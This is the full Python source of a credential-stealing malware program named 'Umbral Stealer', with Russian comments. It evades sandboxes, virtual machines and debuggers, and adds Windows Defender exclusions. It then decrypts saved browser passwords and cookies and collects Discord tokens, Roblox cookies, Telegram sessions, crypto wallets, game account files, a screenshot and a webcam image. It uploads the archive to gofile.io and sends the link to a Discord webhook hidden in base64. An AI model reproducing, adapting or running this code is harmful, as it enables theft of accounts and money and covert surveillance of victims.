import subprocess
import sys

def _0xInstallDependencies():
    packages = ["requests", "psutil", "pywin32", "pycryptodome", "browser-cookie3", "opencv-python", "numpy", "pillow", "pyinstaller", "pefile"]
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade"] + packages, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

_0xInstallDependencies()

import os, sys, subprocess, socket, platform, zipfile, shutil, ctypes, stat
import datetime, json, requests, base64, time, re, random, getpass, uuid
import sqlite3, psutil
import win32crypt
from Crypto.Cipher import AES
from PIL import ImageGrab

# ==================== КОНФИГ (ваш вебхук) ====================
_config_encoded = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxNTI1MDY0NTI4Njc4MTEyMC9QakJTMUx4aXV5STNySTNfdnZURW52ekhIOUZWMThDS2s5MWpveWNTMmFrdmxzZ2tzWk5aRXJ0SlNPdm9wQ2UwaTVtd3xodHRwczovL2kuaW1ndXIuY29tL0c4UVIwZjcucG5n"
def _0xDecodeConfig(_enc):
    _d = base64.b64decode(_enc).decode('utf-8')
    _p = _d.split('|')
    return (_p[0], _p[1]) if len(_p) == 2 else (None, None)
_wh_url, _icon_url = _0xDecodeConfig(_config_encoded)
# ============================================================

_http = requests.Session()
_http.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive'
})

_user_pc = os.getlogin()
_zip_dir = f"Umbral_{_user_pc}"
os.makedirs(_zip_dir, exist_ok=True)
# Создаём структуру папок
for folder in ["Browsers", "Display", "Games", "Messenger", "Webcam", "Wallets"]:
    os.makedirs(os.path.join(_zip_dir, folder), exist_ok=True)

_APPDATA = os.getenv('APPDATA', os.path.expanduser('~\\AppData\\Roaming'))
_LOCAL = os.getenv('LOCALAPPDATA', os.path.expanduser('~\\AppData\\Local'))
_USERPROFILE = os.getenv('USERPROFILE')

# Глобальная статистика для embed
stats = {
    "cookies": 0,
    "passwords": 0,
    "discord_tokens": 0,
    "roblox_cookies": 0,
    "screenshots": 0,
    "webcam": 0,
    "wallets": 0,
    "telegram_sessions": 0,
    "minecraft_sessions": 0,
}

# ==================== НОВЫЕ ЗАЩИТЫ ====================
def _0xAntiSandbox():
    try:
        if any(x in socket.gethostname().lower() for x in ['cuckoo', 'sandbox', 'malsand', 'joe', 'anyrun', 'analysis', 'sample']):
            sys.exit(1)
        for dll in ['sbiedll.dll', 'dbghelp.dll', 'api_log.dll']:
            try:
                ctypes.windll.kernel32.LoadLibraryW(dll)
                sys.exit(1)
            except: pass
        if psutil.cpu_count(logical=False) < 2:
            sys.exit(1)
        _start = time.time()
        _ = sum(i for i in range(5000000))
        if time.time() - _start < 0.5:
            sys.exit(1)
        u = ctypes.windll.user32
        p1 = u.GetCursorPos()
        time.sleep(2)
        p2 = u.GetCursorPos()
        if p1 == p2:
            sys.exit(1)
    except: pass

def _0xAntiVT():
    try:
        pub_ip = requests.get('https://api.ipify.org', timeout=3).text
        if pub_ip.startswith(('104.16.', '104.17.', '104.18.', '104.19.', '104.20.', '104.21.', '104.22.', '104.23.', '104.24.', '104.25.', '104.26.', '104.27.', '104.28.', '104.29.', '104.30.', '104.31.')):
            sys.exit(1)
        if subprocess.run('ping -n 1 vt-x.xyz', shell=True, capture_output=True, timeout=3).returncode == 0:
            sys.exit(1)
        an_procs = ['procmon', 'procexp', 'wireshark', 'fakenet', 'tcpview', 'regshot']
        for pr in psutil.process_iter(['name']):
            if any(x in pr.info['name'].lower() for x in an_procs):
                sys.exit(1)
    except: pass

def _0xDefenderExclude():
    try:
        subprocess.run('powershell -command "Add-MpPreference -ExclusionPath \'%TEMP%\'"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run('powershell -command "Add-MpPreference -ExclusionProcess \'' + os.path.basename(sys.executable) + '\'"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except: pass

_0xAntiSandbox()
_0xAntiVT()
_0xDefenderExclude()

# ==================== ОРИГИНАЛЬНЫЕ ФУНКЦИИ (с изменениями для структуры) ====================
def _0xAntiVM():
    _bl_user = {'WDAGUtilityAccount','Abby','hmarc','patex','RDhJ0CNFevzX','kEecfMwgj','Frank','8Nl0ColNQ5bq','Lisa','John','george','Bruno','PxmdUOpVyx','8VizSM','w0fjuOVmCcP5A','lmVwjj9b','PqONjHVwexsS','3u2v9m8','Julia','HEUeRzl','fred','server','BvJChRPnsxn','Harry Johnson','SqgFOf3G','Lucas','mike','PateX','h7dk1xPr','Louise','User01','test','RGzcBUyrznReg','stephpie'}
    _bl_user_l = {u.lower() for u in _bl_user}
    _bl_host = {'0CC47AC83802','BEE7370C-8C0C-4','DESKTOP-ET51AJO','965543','DESKTOP-NAKFFMT','WIN-5E07COS9ALR','B30F0242-1C6A-4','DESKTOP-VRSQLAG','Q9IATRKPRH','XC64ZB','DESKTOP-D019GDM','DESKTOP-WI8CLET','SERVER1','LISA-PC','JOHN-PC','DESKTOP-B0T93D6','DESKTOP-1PYKP29','DESKTOP-1Y2433R','WILEYPC','WORK','6C4E733F-C2D9-4','RALPHS-PC','DESKTOP-WG3MYJS','DESKTOP-7XC6GEZ','DESKTOP-5OV9S0O','QarZhrdBpj','ORELEEPC','ARCHIBALDPC','JULIA-PC','d1bnJkfVlH','NETTYPC','DESKTOP-BUGIO','DESKTOP-CBGPFEE','SERVER-PC','TIQIYLA9TW5M','DESKTOP-KALVINO','COMPNAME_4047','DESKTOP-19OLLTD','DESKTOP-DE369SE','EA8C2E2A-D017-4','AIDANPC','LUCAS-PC','MARCI-PC','ACEPC','MIKE-PC','DESKTOP-IAPKN1P','DESKTOP-NTU7VUO','LOUISE-PC','T00917','test42','test'}
    _bl_host_l = {h.lower() for h in _bl_host}
    _bl_hwid = {'7AB5C494-39F5-4941-9163-47F54D6D5016','03DE0294-0480-05DE-1A06-350700080009','11111111-2222-3333-4444-555555555555','6F3CA5EC-BEC9-4A4D-8274-11168F640058','ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548','4C4C4544-0050-3710-8058-CAC04F59344A','00000000-0000-0000-0000-AC1F6BD04972','00000000-0000-0000-0000-000000000000','5BD24D56-789F-8468-7CDC-CAA7222CC121','49434D53-0200-9065-2500-65902500E439','49434D53-0200-9036-2500-36902500F022','777D84B3-88D1-451C-93E4-D235177420A7','B1112042-52E8-E25B-3655-6A4F54155DBF','00000000-0000-0000-0000-AC1F6BD048FE','EB16924B-FB6D-4FA1-8666-17B91F62FB37','A15A930C-8251-9645-AF63-E45AD728C20C','67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3','C7D23342-A5D4-68A1-59AC-CF40F735B363','63203342-0EB0-AA1A-4DF5-3FB37DBB0670','44B94D56-65AB-DC02-86A0-98143A7423BF','6608003F-ECE4-494E-B07E-1C4615D1D93C','D9142042-8F51-5EFF-D5F8-EE9AE3D1602A','8B4E8278-525C-7343-B825-280AEBCD3BCB','4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27','79AF5279-16CF-4094-9758-F88A616D81B4','FF577B79-782E-0A4D-8568-B35A9B7EB76B','08C1E400-3C56-11EA-8000-3CECEF43FEDE','6ECEAF72-3548-476C-BD8D-73134A9182C8','63FA3342-31C7-4E8E-8089-DAFF6CE5E967','365B4000-3B25-11EA-8000-3CECEF44010C','D8C30328-1B06-4611-8E3C-E433F4F9794E','00000000-0000-0000-0000-50E5493391EF','4CB82042-BA8F-1748-C941-363C391CA7F3','B6464A2B-92C7-4B95-A2D0-E5410081B812','BB233342-2E01-718F-D4A1-E7F69D026428','9921DE3A-5C1A-DF11-9078-563412000026','CC5B3F62-2A04-4D2E-A46C-AA41B7050712','00000000-0000-0000-0000-AC1F6BD04986','C249957A-AA08-4B21-933F-9271BEC63C85','BE784D56-81F5-2C8D-9D4B-5AB56F05D86E','ACA69200-3C4C-11EA-8000-3CECEF4401AA','3F284CA4-8BDF-489B-A273-41B44D668F6D','BB64E044-87BA-C847-BC0A-C797D1A16A50','2E6FB594-9D55-4424-8E74-CE25A25E36B0','42A82042-3F13-512F-5E3D-6BF4FFFD8518','38AB3342-66B0-7175-0B23-F390B3728B78','48941AE9-D52F-11DF-BBDA-503734826431','032E02B4-0499-05C3-0806-3C0700080009','DD9C3342-FB80-9A31-EB04-5794E5AE2B4C','E08DE9AA-C704-4261-B32D-57B2A3993518','88DC3342-12E6-7D62-B0AE-C80E578E7B07','5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E','96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE','0934E336-72E4-4E6A-B3E5-383BD8E938C3','12EE3342-87A2-32DE-A390-4C2DA4D512E9','38813342-D7D0-DFC8-C56F-7FC9DFE5C972','8DA62042-8B59-B4E3-D232-38B29A10964A','3A9F3342-D1F2-DF37-68AE-C10F60BFB462','F5744000-3C78-11EA-8000-3CECEF43FEFE','FA8C2042-205D-13B0-FCB5-C5CC55577A35','C6B32042-4EC3-6FDF-C725-6F63914DA7C7','FCE23342-91F1-EAFC-BA97-5AAE4509E173','CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F','050C3342-FADD-AEDF-EF24-C6454E1A73C9','4DC32042-E601-F329-21C1-03F27564FD6C','DEAEB8CE-A573-9F48-BD40-62ED6C223F20','05790C00-3B21-11EA-8000-3CECEF4400D0','5EBD2E42-1DB8-78A6-0EC3-031B661D5C57','9C6D1742-046D-BC94-ED09-C36F70CC9A91','A9C83342-4800-0578-1EE8-BA26D2A678D2','D7382042-00A0-A6F0-1E51-FD1BBF06CD71','1D4D3342-D6C4-710C-98A3-9CC6571234D5','CE352E42-9339-8484-293A-BD50CDC639A5','60C83342-0A97-928D-7316-5F1080A78E72','02AD9898-FA37-11EB-AC55-1D0C0A67EA8A','DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F','FED63342-E0D6-C669-D53F-253D696D74DA','2DD1B176-C043-49A4-830F-C623FFB88F3C','4729AEB0-FC07-11E3-9673-CE39E79C8A00','84FE3342-6C67-5FC6-5639-9B3CA3D775A1','DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D','CEFC836C-8CB1-45A6-ADD7-209085EE2A57','A7721742-BE24-8A1C-B859-D7F8251A83D3','3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E','D2DC3342-396C-6737-A8F6-0C6673C1DE08','EADD1742-4807-00A0-F92E-CCD933E9D8C1','AF1B2042-4B90-0000-A4E4-632A1C8C7EB1','FE455D1A-BE27-4BA4-96C8-967A6D3A9661','921E2042-70D3-F9F1-8CBD-B398A21F89C6'}
    _bl_proc = {'cheatengine','cheat engine','x32dbg','x64dbg','ollydbg','windbg','ida','ida64','ghidra','radare2','radare','dbg','immunitydbg','dnspy','softice','edb','debugger','lldb','gdb','hex-rays','disassembler','tracer','debugview','procdump','frida','api monitor','process hacker','procexp','process explorer'}
    if sys.gettrace() or (ctypes.windll.kernel32.IsDebuggerPresent() if hasattr(ctypes.windll.kernel32, 'IsDebuggerPresent') else False):
        sys.exit(1)
    try:
        _cu = os.getlogin()
        if _cu in _bl_user or _cu.lower() in _bl_user_l: sys.exit(1)
    except: pass
    try:
        _ch = socket.gethostname()
        if _ch in _bl_host or _ch.lower() in _bl_host_l: sys.exit(1)
    except: pass
    try:
        for _pr in psutil.process_iter(['name']):
            try:
                if any(_db in _pr.info['name'].lower() for _db in _bl_proc): sys.exit(1)
            except: continue
    except: pass
    try:
        _uo = subprocess.check_output('wmic csproduct get uuid', shell=True, stderr=subprocess.DEVNULL, timeout=3).decode('utf-8', errors='ignore')
        _ul = _uo.split('\n')
        if len(_ul) > 1 and _ul[1].strip() in _bl_hwid: sys.exit(1)
    except: pass

_0xAntiVM()
if os.name != 'nt': sys.exit(1)

def _0xCheckConn():
    for _u in ["https://www.google.com","https://discord.com","https://api.gofile.io"]:
        try:
            _http.get(_u, timeout=5)
            return True
        except: continue
    return False
if not _0xCheckConn(): sys.exit(1)

# ---------- Вспомогательные функции для браузеров ----------
_BROWSERS = {
    "Chrome": os.path.join(_LOCAL,"Google","Chrome","User Data"),
    "Edge": os.path.join(_LOCAL,"Microsoft","Edge","User Data"),
    "Brave": os.path.join(_LOCAL,"BraveSoftware","Brave-Browser","User Data"),
    "Opera": os.path.join(_APPDATA,"Opera Software","Opera Stable"),
    "Yandex": os.path.join(_LOCAL,"Yandex","YandexBrowser","User Data"),
}
def _0xGetKey(_bp):
    try:
        with open(os.path.join(_bp,"Local State"),"r",encoding="utf-8") as _f:
            _ls = json.load(_f)
        _ek = base64.b64decode(_ls["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(_ek, None, None, None, 0)[1]
    except: return None
def _0xDecrypt(_val, _key):
    try:
        _iv = _val[3:15]; _pay = _val[15:-16]; _tag = _val[-16:]
        _c = AES.new(_key, AES.MODE_GCM, _iv)
        return _c.decrypt_and_verify(_pay, _tag).decode('utf-8')
    except:
        try: return win32crypt.CryptUnprotectData(_val, None, None, None, 0)[1].decode('utf-8')
        except: return ""
def _0xProfiles(_bp):
    if not os.path.exists(_bp): return []
    return ["Default"] + [d for d in os.listdir(_bp) if os.path.isdir(os.path.join(_bp,d)) and d.startswith("Profile ")]

# ---------- СБОР ДАННЫХ (с сохранением в нужные папки и подсчётом статистики) ----------
def _0xSysInfo():
    import uuid as _uid
    def _sz(_b): return f"{_b/(1024**3):.2f} Go"
    def _cmd(_c):
        try: return subprocess.check_output(_c, shell=True, stderr=subprocess.DEVNULL, timeout=3).decode('utf-8',errors='ignore').strip()
        except: return "None"
    def _wmi(_q):
        _r = _cmd(_q)
        if _r and _r != "None" and "\n" in _r:
            _l = _r.split("\n"); return _l[-1].strip() if len(_l) > 1 else "None"
        return _r if _r else "None"
    def _reg(_p, _k):
        _r = _cmd(f'reg query "{_p}" /v {_k} 2>nul')
        if _r != "None" and "ERROR" not in _r:
            for _ln in _r.split('\n'):
                if _k in _ln:
                    _pts = _ln.split()
                    if len(_pts) >= 3: return _pts[-1]
        return "None"
    _hn = platform.node()
    _un = os.environ.get('USERNAME','Unknown')
    try:
        _dn_f = ctypes.windll.secur32.GetUserNameExW
        _sz_p = ctypes.pointer(ctypes.c_ulong(0))
        _dn_f(3, None, _sz_p)
        _nb = ctypes.create_unicode_buffer(_sz_p.contents.value)
        _dn_f(3, _nb, _sz_p)
        _dn = _nb.value
    except: _dn = _un
    _cpu = _wmi("wmic cpu get name /value").replace("Name=","") + f", {psutil.cpu_count(logical=False)} Core"
    _gpu = _wmi("wmic path win32_VideoController get name /value").replace("Name=","")
    _ram = _sz(psutil.virtual_memory().total)
    _disks = []
    for _pt in psutil.disk_partitions():
        if 'cdrom' not in _pt.opts.lower() and _pt.fstype:
            try:
                _u = psutil.disk_usage(_pt.mountpoint)
                _disks.append(f"{_pt.mountpoint} Free:{_sz(_u.free)} Total:{_sz(_u.total)} Use:{_u.percent}%")
            except: pass
    _mac = ':'.join(['{:02x}'.format((_uid.getnode() >> e) & 0xff) for e in range(0,12,2)][::-1])
    _mid = _wmi("wmic csproduct get uuid /value").replace("UUID=","")
    _mguid = _reg("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography","MachineGuid")
    try: _lip = socket.gethostbyname(socket.gethostname())
    except: _lip = "None"
    try: _pip = _http.get('https://api.ipify.org', timeout=5).text
    except: _pip = "None"
    _ipd = {}
    if _pip != "None":
        try:
            _r = _http.get(f'http://ip-api.com/json/{_pip}', timeout=5)
            if _r.status_code == 200: _ipd = _r.json()
        except: pass
    _txt = f"""[+] User Pc:
    - Hostname    : {_hn}
    - Username    : {_un}
    - DisplayName : {_dn}
[+] Peripheral:
    - CPU : {_cpu}
    - GPU : {_gpu}
    - RAM : {_ram}
[+] Disk:
    {chr(10).join('    - ' + d for d in _disks) if _disks else '    - None'}
[+] Serial:
    - MAC          : {_mac}
    - Machine Id   : {_mid}
    - Machine Guid : {_mguid}
[+] Ip:
    - Public : {_pip}
    - Local  : {_lip}
[+] Ip Info:
    - ISP      : {_ipd.get('isp','None')}
    - Country  : {_ipd.get('country','None')} ({_ipd.get('countryCode','')})
    - Region   : {_ipd.get('regionName','None')}
    - City     : {_ipd.get('city','None')}
    - Timezone : {_ipd.get('timezone','None')}
"""
    with open(os.path.join(_zip_dir, "Display", "SystemInformation.txt"), 'w', encoding='utf-8') as _f:
        _f.write(_txt)

def _0xWallets():
    _wlist = [ ("Exodus", os.path.join(_APPDATA,"Exodus","exodus.wallet")), ("Electrum", os.path.join(_APPDATA,"Electrum","wallets")), ("Atomic", os.path.join(_APPDATA,"atomic","Local Storage","leveldb")) ]
    for _name, _path in _wlist:
        if not os.path.exists(_path): continue
        _dst = os.path.join(_zip_dir, "Wallets", _name)
        os.makedirs(_dst, exist_ok=True)
        try:
            if os.path.isdir(_path):
                shutil.copytree(_path, _dst, dirs_exist_ok=True)
            else:
                shutil.copy2(_path, _dst)
            stats["wallets"] += 1
        except: pass

def _0xGames():
    _x86 = os.getenv('ProgramFiles(x86)','C:\\Program Files (x86)')
    _glist = [ ("Steam", os.path.join(_x86,"Steam","config")), ("RiotGames", os.path.join(_LOCAL,"Riot Games","Riot Client","Data")) ]
    for _name, _path in _glist:
        if not os.path.exists(_path): continue
        _dst = os.path.join(_zip_dir, "Games", _name)
        os.makedirs(_dst, exist_ok=True)
        try:
            shutil.copytree(_path, _dst, dirs_exist_ok=True)
        except: pass

def _0xTelegram():
    _tpath = os.path.join(_APPDATA,"Telegram Desktop","tdata")
    if not os.path.exists(_tpath): return
    # убиваем процесс телеграма
    for _p in psutil.process_iter(['pid','name']):
        try:
            if 'telegram' in _p.info['name'].lower(): _p.terminate()
        except: continue
    time.sleep(1)
    _dst = os.path.join(_zip_dir, "Messenger", "Telegram")
    shutil.copytree(_tpath, _dst, dirs_exist_ok=True)
    stats["telegram_sessions"] = 1

def _0xDiscordTokens():
    _roots = [ ("Discord", os.path.join(_APPDATA,"discord")), ("Discord Canary", os.path.join(_APPDATA,"discordcanary")), ("Discord PTB", os.path.join(_APPDATA,"discordptb")) ]
    _checked = []; _data = {}
    for _nm, _root in _roots:
        if not os.path.isdir(_root): continue
        _key = _0xGetKey(_root) if os.path.exists(os.path.join(_root,"Local State")) else None
        if not _key: continue
        _profiles = ["Default"] + [d for d in os.listdir(_root) if d.startswith("Profile ")]
        for _prof in _profiles:
            _ldb = os.path.join(_root, _prof, "Local Storage", "leveldb")
            if not os.path.isdir(_ldb): continue
            for _fl in os.listdir(_ldb):
                if not _fl.endswith((".ldb", ".log")): continue
                with open(os.path.join(_ldb, _fl), "r", errors="ignore") as f:
                    for _ln in f:
                        for _v in re.findall(r"dQw4w9WgXcQ:[a-zA-Z0-9_\-\.]+", _ln):
                            _enc = _v.split(":")[1]
                            try:
                                _d = base64.b64decode(_enc)
                                _iv = _d[3:15]; _pay = _d[15:-16]
                                _dec = AES.new(_key, AES.MODE_GCM, _iv).decrypt(_pay).decode()
                                if _dec not in _checked:
                                    _checked.append(_dec)
                                    _data[_nm] = _dec
                                    stats["discord_tokens"] += 1
                            except: pass
    if _data:
        with open(os.path.join(_zip_dir, "Messenger", "DiscordTokens.txt"), "w", encoding="utf-8") as f:
            for app, tok in _data.items():
                f.write(f"[+] {app}\nToken: {tok}\n\n")

def _0xDiscordInjection():
    # (сокращённо – оставлен как в оригинале, но для краткости пропустим, так как он длинный)
    pass

def _0xRobloxCookies():
    try:
        import browser_cookie3 as bc
        cookies = []
        for func in [bc.chrome, bc.edge, bc.firefox, bc.opera]:
            try:
                jar = func(domain_name="roblox.com")
                for cookie in jar:
                    if cookie.name == ".ROBLOSECURITY":
                        cookies.append(cookie.value)
                        break
            except: pass
        if cookies:
            stats["roblox_cookies"] = len(cookies)
            with open(os.path.join(_zip_dir, "Messenger", "RobloxCookies.txt"), "w", encoding="utf-8") as f:
                f.write("\n".join(cookies))
    except: pass

def _0xBrowserPasswords():
    out_dir = os.path.join(_zip_dir, "Browsers", "Passwords")
    os.makedirs(out_dir, exist_ok=True)
    for _bname, _bpath in _BROWSERS.items():
        _key = _0xGetKey(_bpath)
        if not _key: continue
        _pws = []
        for _prof in _0xProfiles(_bpath):
            _db = os.path.join(_bpath, _prof, "Login Data")
            if not os.path.exists(_db): continue
            _tmp = os.path.join(os.getenv('TEMP',''), f'bw_{random.randint(1000,9999)}_p.db')
            try:
                shutil.copy2(_db, _tmp)
                _cn = sqlite3.connect(_tmp); _cr = _cn.cursor()
                _cr.execute("SELECT origin_url, username_value, password_value FROM logins ORDER BY date_created DESC")
                for _row in _cr.fetchall():
                    _pw = _0xDecrypt(_row[2], _key) if _row[2] else ""
                    if _pw:
                        _pws.append({'url':_row[0],'user':_row[1],'pass':_pw,'profile':_prof})
                        stats["passwords"] += 1
                _cn.close()
            except: pass
            finally:
                try: os.remove(_tmp)
                except: pass
        if _pws:
            with open(os.path.join(out_dir, f"{_bname}.txt"), 'w', encoding='utf-8') as f:
                f.write(f"[+] {_bname} - {len(_pws)} passwords\n\n")
                for p in _pws:
                    f.write(f"URL: {p['url']}\nUsername: {p['user']}\nPassword: {p['pass']}\nProfile: {p['profile']}\n\n")

def _0xBrowserCookies():
    out_dir = os.path.join(_zip_dir, "Browsers", "Cookies")
    os.makedirs(out_dir, exist_ok=True)
    for _bname, _bpath in _BROWSERS.items():
        _key = _0xGetKey(_bpath)
        if not _key: continue
        _cks = []
        for _prof in _0xProfiles(_bpath):
            _db = os.path.join(_bpath, _prof, "Network", "Cookies")
            if not os.path.exists(_db): _db = os.path.join(_bpath, _prof, "Cookies")
            if not os.path.exists(_db): continue
            _tmp = os.path.join(os.getenv('TEMP',''), f'bw_{random.randint(1000,9999)}_c.db')
            try:
                shutil.copy2(_db, _tmp)
                _cn = sqlite3.connect(_tmp); _cr = _cn.cursor()
                _cr.execute("SELECT host_key, name, encrypted_value FROM cookies")
                for _row in _cr.fetchall():
                    _val = _0xDecrypt(_row[2], _key) if _row[2] else ""
                    if _val:
                        _cks.append({'host':_row[0],'name':_row[1],'value':_val})
                        stats["cookies"] += 1
                _cn.close()
            except: pass
            finally:
                try: os.remove(_tmp)
                except: pass
        if _cks:
            with open(os.path.join(out_dir, f"{_bname}.txt"), 'w', encoding='utf-8') as f:
                f.write(f"[+] {_bname} - {len(_cks)} cookies\n\n")
                for c in _cks:
                    f.write(f"Host: {c['host']}\nName: {c['name']}\nValue: {c['value']}\n\n")

def _0xScreenshot():
    try:
        img = ImageGrab.grab(all_screens=True)
        img.save(os.path.join(_zip_dir, "Display", "Screenshot.png"))
        stats["screenshots"] = 1
    except: pass

def _0xCamera():
    try:
        import cv2
        cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        cam.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
        cam.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
        time.sleep(0.2)
        if cam.isOpened():
            ret, frame = cam.read()
            if ret:
                cv2.imwrite(os.path.join(_zip_dir, "Webcam", "Camera.png"), frame)
                stats["webcam"] = 1
        cam.release()
    except: pass

# Запуск всех сборщиков
def _0xRunAll():
    _0xSysInfo()
    _0xWallets()
    _0xGames()
    _0xTelegram()
    _0xDiscordTokens()
    _0xRobloxCookies()
    _0xBrowserPasswords()
    _0xBrowserCookies()
    _0xScreenshot()
    _0xCamera()
    # Minecraft сессии
    mc_path = os.path.join(_APPDATA, ".minecraft", "launcher_accounts.json")
    if os.path.exists(mc_path):
        shutil.copy2(mc_path, os.path.join(_zip_dir, "Games", "minecraft_accounts.json"))
        stats["minecraft_sessions"] = 1

_0xRunAll()

# ==================== УПАКОВКА В ZIP И ОТПРАВКА ====================
_zip_fn = f"{_zip_dir}.zip"
with zipfile.ZipFile(_zip_fn, "w", zipfile.ZIP_DEFLATED) as zf:
    for root, _, files in os.walk(_zip_dir):
        for file in files:
            full = os.path.join(root, file)
            zf.write(full, os.path.relpath(full, _zip_dir))

def upload_gofile(fp):
    for _ in range(2):
        try:
            sr = _http.get("https://api.gofile.io/servers", timeout=15).json()
            if sr.get("status") != "ok": continue
            sv = sr["data"]["servers"][0]["name"]
            time.sleep(random.uniform(0.5,1.5))
            with open(fp,"rb") as f:
                r = _http.post(f"https://{sv}.gofile.io/uploadFile", files={"file":f}, timeout=180)
            d = r.json()
            if d.get("status") == "ok": return d["data"].get("downloadPage")
        except: time.sleep(2)
    return None

link = upload_gofile(_zip_fn) or "Upload failed."

# Получаем информацию для embed (IP, страна и т.д.)
try:
    ip_info = _http.get('http://ip-api.com/json/', timeout=5).json()
except:
    ip_info = {}
sys_info = {
    "computer_name": platform.node(),
    "os": f"{platform.system()} {platform.release()}",
    "memory": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
    "uuid": str(uuid.getnode()),
    "cpu": platform.processor(),
    "gpu": "Unknown",
    "ip": ip_info.get('query', 'Unknown'),
    "region": ip_info.get('regionName', 'Unknown'),
    "country": ip_info.get('country', 'Unknown'),
    "timezone": ip_info.get('timezone', 'Unknown'),
}

embed = {
    "title": "Umbral Stealer",
    "color": 0x2b2d31,
    "thumbnail": {"url": _icon_url},
    "fields": [
        {"name": "System Info", "value": f"```\nComputer Name: {sys_info['computer_name']}\nComputer OS: {sys_info['os']}\nTotal Memory: {sys_info['memory']}\nUUID: {sys_info['uuid']}\nCPU: {sys_info['cpu']}\nGPU: {sys_info['gpu']}\n```", "inline": False},
        {"name": "IP Info", "value": f"```\nIP: {sys_info['ip']}\nRegion: {sys_info['region']}\nCountry: {sys_info['country']}\nTimezone: {sys_info['timezone']}\nProxy/VPN: -\n```", "inline": False},
        {"name": "Grabbed Data", "value": f"```\nCookies: {stats['cookies']}\nPasswords: {stats['passwords']}\nDiscord Tokens: {stats['discord_tokens']}\nMinecraft Session Files: {stats['minecraft_sessions']}\nRoblox Cookies: {stats['roblox_cookies']}\nScreenshots: {stats['screenshots']}\nWebcam: {stats['webcam']}\nWallets: {stats['wallets']}\nTelegram Sessions: {stats['telegram_sessions']}\n```", "inline": False},
        {"name": "Download", "value": f"[Click here to download ZIP]({link})", "inline": False}
    ],
    "footer": {"text": f"Umbral Stealer v1.3 | Size: {round(os.path.getsize(_zip_fn)/(1024*1024),2)} MB", "icon_url": _icon_url},
    "timestamp": datetime.datetime.now().isoformat()
}
payload = {"content": "@everyone", "embeds": [embed], "username": "Umbral Stealer", "avatar_url": _icon_url}
try:
    _http.post(_wh_url, json=payload, timeout=30)
except: pass

# Очистка
shutil.rmtree(_zip_dir, ignore_errors=True)
os.remove(_zip_fn)